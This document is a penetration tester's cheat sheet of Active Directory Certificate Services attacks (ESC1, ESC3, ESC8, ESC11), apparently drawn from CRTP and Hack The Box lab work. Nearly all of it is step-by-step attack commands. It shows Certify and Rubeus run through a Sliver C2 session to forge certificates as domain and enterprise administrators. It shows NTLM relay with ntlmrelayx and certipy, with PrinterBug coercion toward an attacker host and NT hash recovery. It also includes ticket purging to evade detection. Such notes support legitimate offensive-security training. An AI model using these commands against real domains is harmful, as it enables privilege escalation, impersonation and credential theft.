# Active Directory Certificate Services (AD CS) Attacks

> **Pre-req:** `source $HOME/Pentester/ptTools/venvHTB/bin/activate`

### ESC1 – Enrollee Supplies Subject (Sliver / CRTP) [added: 2026-04]
- **Tags:** #ESC1 #ADCS #Certify #Rubeus #PKINIT #CertificateAbuse #EnrolleeSuppliesSubject #T1649
- **Trigger:** Certificate template with ENROLLEE_SUPPLIES_SUBJECT flag found; low-privileged users have enrollment rights
- **Prereq:** Valid domain credentials with enrollment rights on vulnerable template, Certify.exe and Rubeus.exe available
- **Yields:** Certificate with arbitrary SAN (e.g., administrator UPN), TGT as any domain user including DA/EA
- **Opsec:** Med
- **Context:** Certificate template has `ENROLLEE_SUPPLIES_SUBJECT` flag AND low-privileged users have enrollment rights. Request a cert with any user's UPN as the SAN.
- **Payload/Method:**
```
# Step 1: Enumerate vulnerable templates
[server] sliver (session) > execute-assembly ... Certify.exe 'find /enrolleeSuppliesSubject'

# Step 2: Request cert for DA impersonation
[server] sliver (session) > execute-assembly ... Certify.exe 'request /ca:ca-host\CA-NAME /template:"VulnerableTemplate" /altname:administrator'

# Step 3: Convert PEM to PFX
openssl pkcs12 -in esc1.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out esc1.pfx
# Enter export password: Passw0rd!

# Step 4: Use PFX to get TGT via PKINIT
[server] sliver (session) > execute-assembly ... Rubeus.exe 'asktgt /user:administrator /certificate:C:\path\esc1.pfx /password:Passw0rd! /ptt'

# To get EA (mcorp\Administrator):
Certify.exe 'request /ca:mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA /template:"HTTPSCertificates" /altname:moneycorp.local\administrator'
Rubeus.exe 'asktgt /user:moneycorp.local\Administrator /dc:mcorp-dc.moneycorp.local /certificate:esc1-EA.pfx /password:Passw0rd! /ptt'
```

### ESC3 – Certificate Request Agent Abuse (Sliver / CRTP) [added: 2026-04]
- **Tags:** #ESC3 #ADCS #CertificateRequestAgent #Certify #Rubeus #EnrollOnBehalf #T1649
- **Trigger:** Two vulnerable templates found: one allows Certificate Request Agent enrollment, another allows enrollment on behalf of another user
- **Prereq:** Valid domain credentials, enrollment rights on Agent template and on-behalf-of template, Certify.exe and Rubeus.exe
- **Yields:** Certificate and TGT as any domain user (DA/EA) via agent-based enrollment chain
- **Opsec:** Med
- **Context:** Two templates: one allows enrollment as "Certificate Request Agent" (Agent template), another allows enrollment on behalf of another user using an Agent cert.
- **Payload/Method:**
```
# Step 1: Enroll for Certificate Request Agent cert using SmartCardEnrollment-Agent template
[server] sliver (session) > execute-assembly ... Certify.exe 'request /ca:mcorp-dc\moneycorp-MCORP-DC-CA /template:SmartCardEnrollment-Agent'
# Convert to PFX (same openssl step as ESC1)

# Step 2: Use agent cert to request a cert on behalf of DA
[server] sliver (session) > execute-assembly ... Certify.exe 'request /ca:mcorp-dc\moneycorp-MCORP-DC-CA /template:SmartCardEnrollment-Users /onbehalfof:dcorp\administrator /enrollment-agent-certificate:esc3-agent.pfx /enrollment-agent-password:Passw0rd!'
# Convert resulting cert to PFX

# Step 3: Use PFX to get TGT
Rubeus.exe 'asktgt /user:administrator /certificate:esc3-DA.pfx /password:Passw0rd! /ptt'
```

### Purge Tickets After Use [added: 2026-04]
- **Tags:** #TicketPurge #Rubeus #Kerberos #Cleanup #OPSEC #TicketManagement
- **Trigger:** After using injected Kerberos tickets; need to clean up before next operation
- **Prereq:** Rubeus.exe available on current host
- **Yields:** Clean Kerberos ticket cache, preventing ticket reuse detection or confusion
- **Opsec:** Low
```powershell
.\Rubeus.exe purge
```

### ESC8 — NTLM Relay to AD CS HTTP Enrollment (Web Enrollment) [added: 2026-04]
- **Tags:** #ESC8 #ADCS #NTLMRelay #certipy #ntlmrelayx #PrinterBug #WebEnrollment #T1649 #T1557.001
- **Trigger:** AD CS web enrollment endpoint (certsrv) accessible over HTTP without EPA; coercion method available (PrinterBug, PetitPotam)
- **Prereq:** Valid domain credentials, AD CS with HTTP enrollment enabled, ntlmrelayx and coercion tool available
- **Yields:** Machine certificate for relayed target, TGT and NT hash of machine account (enables DCSync if DC)
- **Opsec:** High
- **Context:** AD CS web enrollment endpoint (certsrv) does not enforce HTTPS or EPA. Relay machine/user NTLM auth to request a certificate on their behalf.
- **Payload/Method:**
  ```bash
  # Step 1: Enumerate ADCS servers
  crackmapexec ldap <SUBNET> -u 'user' -p 'password' -M adcs
  crackmapexec ldap <DC_IP> -u user -p 'password' -M adcs -o SERVER=<CA_NAME>

  # Step 2: Enumerate CA config with certipy
  certipy find -enabled -u 'user'@<DC_IP> -p 'password' -stdout

  # Step 3: Start relay targeting certsrv
  ntlmrelayx.py -t http://<CA_IP>/certsrv/certfnsh.asp -smb2support --adcs --template Machine

  # Step 4: Coerce target machine auth (e.g., PrinterBug)
  python3 printerbug.py domain/user:'password'@<TARGET> <ATTACKER_IP>

  # Step 5: Decode captured base64 certificate
  echo -n "<BASE64_CERT>" | base64 -d > machine.pfx

  # Step 6: Request TGT with certificate
  python3 gettgtpkinit.py -dc-ip <DC_IP> -cert-pfx machine.pfx 'DOMAIN/MACHINE$' machine.ccache

  # Step 7: Recover NT hash from AS-REP encryption key
  KRB5CCNAME=machine.ccache python3 getnthash.py 'DOMAIN/MACHINE$' -key <AS_REP_KEY>
  ```

### ESC11 — NTLM Relay to AD CS via RPC (No Web Enrollment Needed) [added: 2026-04]
- **Tags:** #ESC11 #ADCS #NTLMRelay #certipy #RPC #PrinterBug #CertificateAbuse #T1649 #T1557.001
- **Trigger:** CA has NTLM auth enabled on RPC interface (IF_ENFORCEENCRYPTICERTREQUEST not set); web enrollment disabled
- **Prereq:** Valid domain credentials, certipy relay capability, coercion method available (PrinterBug/PetitPotam)
- **Yields:** Machine certificate for relayed target, enabling TGT request and authentication as machine account
- **Opsec:** High
- **Context:** CA has NTLM auth enabled on RPC interface (IF_ENFORCEENCRYPTICERTREQUEST not set). Relay to RPC endpoint instead of HTTP — works when web enrollment is disabled.
- **Payload/Method:**
  ```bash
  # Step 1: Start certipy relay targeting RPC
  certipy relay -target "rpc://<CA_IP>" -ca "<CA_NAME>"

  # Step 2: Coerce NTLM auth from target
  python3 printerbug.py domain/user:'password'@<TARGET> <ATTACKER_IP>

  # Step 3: Authenticate with resulting certificate
  certipy auth -pfx machine.pfx -dc-ip <DC_IP>
  ```
